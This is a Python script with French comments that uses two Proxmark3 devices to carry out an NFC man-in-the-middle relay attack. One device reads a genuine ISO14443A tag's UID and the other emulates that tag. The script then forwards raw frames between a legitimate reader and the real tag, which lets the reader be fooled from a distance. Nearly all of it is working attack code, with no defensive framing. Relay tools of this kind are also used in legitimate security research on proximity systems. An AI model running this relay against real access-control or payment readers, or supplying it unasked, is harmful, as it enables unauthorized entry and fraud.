#!/usr/bin/env python3
import serial
import struct
import time
import sys

# --- Constantes Protocole Proxmark3 (Iceman) ---
COMMANDNG_PREAMBLE_MAGIC  = 0x61334d50
COMMANDNG_POSTAMBLE_MAGIC = 0x3361
RESPONSENG_PREAMBLE_MAGIC = 0x62334d50

CMD_PING                    = 0x0109
CMD_HF_ISO14443A_READER     = 0x0385
CMD_HF_ISO14443A_SIMULATE   = 0x0384
CMD_HF_MIFARE_SIMULATE      = 0x0604  # Trame reçue du lecteur pendant sim

# Flags Reader/Sim
ISO14A_CONNECT          = (1 << 0)
ISO14A_NO_DISCONNECT    = (1 << 1)
ISO14A_RAW              = (1 << 3)
ISO14A_APPEND_CRC       = (1 << 4)
FLAG_7B_UID_IN_DATA     = 0x0020

class NfcMitM:
    def __init__(self, mole_port='/dev/ttyACM1', proxy_port='/dev/ttyACM0'):
        print(f"[*] Initialisation : Mole={mole_port}, Proxy={proxy_port}")
        self.mole = serial.Serial(mole_port, 115200, timeout=0.01)
        self.proxy = serial.Serial(proxy_port, 115200, timeout=0.01)
        self.tag_uid = None

    def _send_ng(self, ser, cmd, data=b''):
        """ Envoi d'une frame NG pure """
        length_ng = (len(data) & 0x7FFF) | (1 << 15)
        pkt = struct.pack('<IHH', COMMANDNG_PREAMBLE_MAGIC, length_ng, cmd)
        pkt += data + struct.pack('<H', COMMANDNG_POSTAMBLE_MAGIC)
        ser.write(pkt)
        ser.flush()

    def _send_mix(self, ser, cmd, arg0=0, arg1=0, arg2=0, data=b''):
        """ Envoi d'une frame MIX (avec arguments) """
        payload = struct.pack('<QQQ', arg0, arg1, arg2) + data
        length_ng = len(payload) & 0x7FFF
        pkt = struct.pack('<IHH', COMMANDNG_PREAMBLE_MAGIC, length_ng, cmd)
        pkt += payload + struct.pack('<H', COMMANDNG_POSTAMBLE_MAGIC)
        ser.write(pkt)
        ser.flush()

    def _read_frame(self, ser, timeout=0.5):
        """ Lecture et décodage d'une réponse PM3 """
        start = time.time()
        while (time.time() - start) < timeout:
            if ser.in_waiting >= 10:
                head = ser.read(10)
                magic, length_ng, cmd, status, reason = struct.unpack('<IHHBB', head)
                if magic != RESPONSENG_PREAMBLE_MAGIC:
                    continue
                
                length = length_ng & 0x7FFF
                payload = b''
                while len(payload) < length:
                    payload += ser.read(length - len(payload))
                ser.read(2) # postamble
                
                data = payload[24:] if not (length_ng >> 15) else payload
                return {'cmd': cmd, 'data': data, 'status': status}
        return None

    def setup_relay(self):
        print("\n[1] Recherche du tag sur la MOLE...")
        self._send_mix(self.mole, CMD_HF_ISO14443A_READER, arg0=ISO14A_CONNECT)
        resp = self._read_frame(self.mole)
        
        if not resp or len(resp['data']) < 14:
            print("[-] Erreur : Aucun tag détecté sur la Mole.")
            return False
        
        d = resp['data']
        self.tag_uid = d[0:d[10]]
        print(f"[+] Tag trouvé ! UID: {self.tag_uid.hex().upper()}")

        print("\n[2] Lancement de la simulation sur le PROXY...")
        # Construction du payload de simulation (68 octets)
        tagtype = 2 # Ultralight
        uid_padded = self.tag_uid.ljust(10, b'\x00')[:10]
        sim_payload = struct.pack('<B', tagtype) + struct.pack('<H', FLAG_7B_UID_IN_DATA)
        sim_payload += uid_padded + struct.pack('<B', 0) + bytes(20) + bytes(34)
        
        self._send_ng(self.proxy, CMD_HF_ISO14443A_SIMULATE, sim_payload)
        time.sleep(0.5)
        print("[+] Simulation active. Le Proxy imite maintenant le tag.")
        return True

    def loop(self):
        print("\n[3] Entrée en mode MITM (Pont transparent)")
        print("[-] En attente d'une commande du lecteur... (Ctrl+C pour quitter)")
        
        try:
            while True:
                # Écoute du PROXY (Lecteur -> Proxy)
                p_resp = self._read_frame(self.proxy, timeout=0.01)
                
                if p_resp and p_resp['cmd'] == CMD_HF_MIFARE_SIMULATE:
                    reader_cmd = p_resp['data']
                    print(f"\nLECTEUR >> {reader_cmd.hex()}")
                    
                    # TRANSIT : Envoi direct au tag via MOLE
                    flags = ISO14A_RAW | ISO14A_NO_DISCONNECT | ISO14A_APPEND_CRC
                    self._send_mix(self.mole, CMD_HF_ISO14443A_READER, arg0=flags, data=reader_cmd)
                    
                    # RÉPONSE DU TAG
                    t_resp = self._read_frame(self.mole, timeout=0.1)
                    if t_resp and t_resp['data']:
                        tag_data = t_resp['data']
                        print(f"TAG     << {tag_data.hex()}")
                        
                        # TRANSIT : Retour au lecteur via PROXY
                        self._send_mix(self.proxy, CMD_HF_ISO14443A_READER, arg0=flags, data=tag_data)
                        # On vide le buffer de confirmation du proxy
                        self._read_frame(self.proxy, timeout=0.01)
                    else:
                        print("TAG     << (Pas de réponse)")

        except KeyboardInterrupt:
            print("\n[*] Arrêt du relais.")

if __name__ == "__main__":
    # Paramètres : adapter les ports ACM selon ta config
    mitm = NfcMitM(mole_port='/dev/ttyACM1', proxy_port='/dev/ttyACM0')
    
    if mitm.setup_relay():
        mitm.loop()
    
    mitm.mole.close()
    mitm.proxy.close()
    print("[*] Ports fermés.")